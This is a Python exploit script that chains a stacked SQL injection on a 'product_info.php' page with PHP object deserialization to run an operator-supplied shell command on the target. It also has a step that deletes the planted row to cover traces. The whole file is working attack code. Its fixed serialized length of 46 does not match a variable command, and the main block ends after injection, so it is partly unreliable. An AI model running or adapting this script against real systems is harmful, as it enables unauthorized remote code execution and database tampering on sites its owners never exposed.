import argparse
import requests
import base64

# 功能模組

# 步驟 1: 構造序列化資料並進行 Base64 編碼
def create_payload(remote_cmd):
    # PHP 序列化資料模擬
    serialized_data = (
        'O:9:"ApiTester":2:{'
        's:2:"ip";s:9:"127.0.0.1";'
        's:14:"ApiTesterres";s:46:"\' && ' + remote_cmd + ' && echo\'";}'
    )
    # Base64 編碼
    encoded_data = base64.b64encode(serialized_data.encode()).decode()
    print("[+] Serialized Data:")
    print(serialized_data)
    print("[+] Base64 Encoded Payload:")
    print(encoded_data)
    return encoded_data


# 步驟 2: 利用 SQL Injection 插入惡意資料
def inject_payload(target_url, encoded_payload):
    injection_url = f"{target_url}?page=product_info.php&id=1;"
    injection_payload = (
        f"INSERT INTO products (name, description, category, price, attributes) "
        f"VALUES ('evil1', 'evil', 'evil', 0.00, FROM_BASE64('{encoded_payload}'))"
    )
    response = requests.get(injection_url + injection_payload)
    if response.status_code == 200:
        print("[+] Payload Injected Successfully!")
    else:
        print("[-] Injection Failed!")
    return response.status_code == 200

# 步驟 3: 構造觸發 URL 執行指令
def trigger_payload(target_url, product_id):
    trigger_url = f"{target_url}?page=product_info.php&id={product_id}"
    response = requests.get(trigger_url)
    if response.status_code == 200:
        print("[+] Payload Triggered Successfully!")
        print(response.text)
    else:
        print("[-] Trigger Failed!")
    return response

# 步驟 4: 刪除惡意資料
def delete_payload(target_url, product_name="evil1"):
    delete_url = f"{target_url}?page=product_info.php&id=1;"
    delete_payload = f"DELETE FROM products WHERE name='{product_name}'"
    response = requests.get(delete_url + delete_payload)
    if response.status_code == 200:
        print("[+] Malicious Payload Deleted Successfully!")
    else:
        print("[-] Deletion Failed!")
    return response.status_code == 200

# 主程式入口
if __name__ == "__main__":
    # 命令列參數解析
    parser = argparse.ArgumentParser(description="Automate an attack sequence with SQL Injection and RCE.")
    parser.add_argument("-u", "--url", required=True, help="Target URL of the application.")
    parser.add_argument("-c", "--cmd", required=True, help="Remote command to execute.")
    args = parser.parse_args()

    # 提取參數
    TARGET_URL = args.url
    REMOTE_CMD = args.cmd

    print("[*] Starting Attack Automation...")

    # 1. 創建序列化資料並編碼
    payload = create_payload(REMOTE_CMD)

    inject_payload(TARGET_URL, payload)

